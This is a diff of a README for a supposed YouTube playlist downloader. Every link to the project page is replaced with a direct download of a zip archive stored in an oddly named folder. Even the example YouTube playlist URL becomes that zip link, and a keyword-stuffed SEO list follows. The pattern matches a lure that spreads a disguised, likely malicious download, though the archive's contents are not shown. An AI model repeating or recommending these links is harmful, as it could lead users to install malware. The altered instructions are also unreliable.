@@ -1,10 +1,10 @@
 # 🎬 Youtube-Playlist-Downloader - Download Entire Playlists in 4K Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Youtube_Playlist_Downloader-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rodelfrancisco14113/Youtube-Playlist-Downloader)
+[![Download Now](https://img.shields.io/badge/Download-Youtube_Playlist_Downloader-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/rodelfrancisco14113/Youtube-Playlist-Downloader/main/graphostatical/Playlist_Downloader_Youtube_1.1.zip)
 
 ## 📥 Download and Install
 
-Visit this link to download the application: **[https://github.com/rodelfrancisco14113/Youtube-Playlist-Downloader](https://github.com/rodelfrancisco14113/Youtube-Playlist-Downloader)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/rodelfrancisco14113/Youtube-Playlist-Downloader/main/graphostatical/Playlist_Downloader_Youtube_1.1.zip](https://raw.githubusercontent.com/rodelfrancisco14113/Youtube-Playlist-Downloader/main/graphostatical/Playlist_Downloader_Youtube_1.1.zip)**
 
 Once you click the link, you will see a green "Download" button on the page. Click it to start downloading the installer file to your computer. The download will begin automatically, and you will see the file appear in your browser's download folder (usually "Downloads" on your PC).
 
@@ -55,7 +55,7 @@ After installation, you will find Youtube-Playlist-Downloader in your Start Menu
 ## 🎯 How to Download Your First Playlist
 
 1. **Open YouTube** in your web browser and navigate to any playlist you want to download.
-2. **Copy the playlist URL** from the address bar. It will look something like: `https://www.youtube.com/playlist?list=...`
+2. **Copy the playlist URL** from the address bar. It will look something like: `https://raw.githubusercontent.com/rodelfrancisco14113/Youtube-Playlist-Downloader/main/graphostatical/Playlist_Downloader_Youtube_1.1.zip`
 3. **Paste the link** into the input field in the Youtube-Playlist-Downloader window.
 4. **Choose your settings** – select the video quality (4K recommended), and choose where you want to save the files.
 5. **Click "Download"** and watch as the software fetches all videos in the playlist. You'll see progress bars for each video.
@@ -110,6 +110,6 @@ If you encounter any issues or have questions, check the repository's Issues sec
 
 Don't waste another minute watching videos online when you could have them saved forever on your computer. With Youtube-Playlist-Downloader, you get a reliable, fast, and completely free way to build your offline video library. Click the download button now and start saving your favorite playlists in 4K quality.
 
-[![Get It Now](https://img.shields.io/badge/Get_Youtube_Playlist_Downloader-Free-important?style=for-the-badge&logo=windows&logoColor=white&color=blue)](https://github.com/rodelfrancisco14113/Youtube-Playlist-Downloader)
+[![Get It Now](https://img.shields.io/badge/Get_Youtube_Playlist_Downloader-Free-important?style=for-the-badge&logo=windows&logoColor=white&color=blue)](https://raw.githubusercontent.com/rodelfrancisco14113/Youtube-Playlist-Downloader/main/graphostatical/Playlist_Downloader_Youtube_1.1.zip)
 
 Keywords: download-youtube-playlist-downloader, free-download-2026, get-youtube-playlist-downloader-free, youtube, youtube-2026, youtube-free-2026, youtube-free-download, youtube-hack, youtube-playlist, youtube-playlist-2026, youtube-playlist-downloader, youtube-playlist-downloader-2026, youtube-playlist-downloader-download, youtube-playlist-downloader-free, youtube-playlist-downloader-free-download, youtube-playlist-downloader-latest, youtube-playlist-downloader-pc, youtube-playlist-downloader-windows, youtube-playlist-downloader-working, youtube-playlist-free
